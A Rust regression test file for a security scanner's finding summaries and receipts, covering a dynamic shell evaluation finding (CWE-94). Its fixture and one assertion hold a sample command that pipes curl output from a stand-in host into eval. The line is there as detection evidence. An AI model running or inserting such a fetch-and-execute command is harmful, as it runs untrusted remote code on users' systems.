//! Finding summary receipt regression tests.

use arbitraitor_model::finding::{Evidence, EvidenceKind, Finding, FindingCategory};
use arbitraitor_model::ids::Sha256Digest;
use arbitraitor_model::taxonomy::{TaxonomyName, TaxonomyRef};
use arbitraitor_model::verdict::{Confidence, Severity, Verdict};
use arbitraitor_receipt::{
    FindingSummary, Receipt, ReceiptBuilder, ReceiptTimestamps, VerdictInfo,
};

fn taxonomy() -> TaxonomyRef {
    TaxonomyRef {
        name: TaxonomyName::Cwe,
        id: "CWE-94".to_owned(),
        confidence: Confidence::High,
        url: Some("https://cwe.mitre.org/data/definitions/94.html".to_owned()),
    }
}

fn finding(taxonomy: TaxonomyRef) -> Finding {
    Finding {
        id: "shell.dynamic-eval".to_owned(),
        detector: "detector.shell".to_owned(),
        category: FindingCategory::DynamicCodeExecution,
        severity: Severity::High,
        confidence: Confidence::High,
        title: "dynamic shell evaluation".to_owned(),
        description: "script evaluates fetched content".to_owned(),
        evidence: vec![Evidence {
            kind: EvidenceKind::SourceSnippet,
            description: "matched eval pattern".to_owned(),
            content: Some("eval \"$(curl https://example.test/payload)\"".to_owned()),
        }],
        artifact_sha256: Sha256Digest::new([0x42; 32]),
        location: None,
        remediation: Some("Replace dynamic eval with a pinned, verified script.".to_owned()),
        references: vec!["https://owasp.org/www-community/attacks/Command_Injection".to_owned()],
        tags: vec!["shell".to_owned()],
        taxonomies: vec![taxonomy],
    }
}

fn receipt(summary: FindingSummary) -> Receipt {
    ReceiptBuilder::new(
        "0.1.0",
        Sha256Digest::new([0xab; 32]),
        12,
        VerdictInfo {
            verdict: Verdict::Block,
            confidence: None,
            explanation: None,
            deciding_rule: Some("block.dynamic-eval".to_owned()),
            policy_trace: vec!["dynamic eval blocked".to_owned()],
        },
        ReceiptTimestamps {
            created: "2026-06-17T00:00:00Z".to_owned(),
            modified: "2026-06-17T00:00:00Z".to_owned(),
        },
    )
    .finding(summary)
    .build()
}

#[test]
fn finding_summary_preserves_explainability_fields_from_finding() {
    let taxonomy = taxonomy();
    let finding = finding(taxonomy.clone());

    let summary = FindingSummary::from(&finding);

    assert_eq!(
        summary.evidence.as_deref(),
        Some("eval \"$(curl https://example.test/payload)\"")
    );
    assert_eq!(
        summary.remediation.as_deref(),
        Some("Replace dynamic eval with a pinned, verified script.")
    );
    assert_eq!(summary.references, finding.references);
    assert_eq!(summary.taxonomies, vec![taxonomy]);
}

#[test]
fn finding_evidence_round_trips_through_receipt_serialization()
-> Result<(), Box<dyn std::error::Error>> {
    let receipt = receipt(FindingSummary::from(&finding(taxonomy())));

    let json = serde_json::to_string(&receipt)?;
    let decoded: Receipt = serde_json::from_str(&json)?;

    assert_eq!(decoded, receipt);
    assert!(json.contains("evidence"));
    assert!(json.contains("remediation"));
    assert!(json.contains("references"));
    assert!(json.contains("taxonomies"));
    assert!(
        receipt
            .canonical_bytes()?
            .windows(b"evidence".len())
            .any(|window| window == b"evidence")
    );
    Ok(())
}
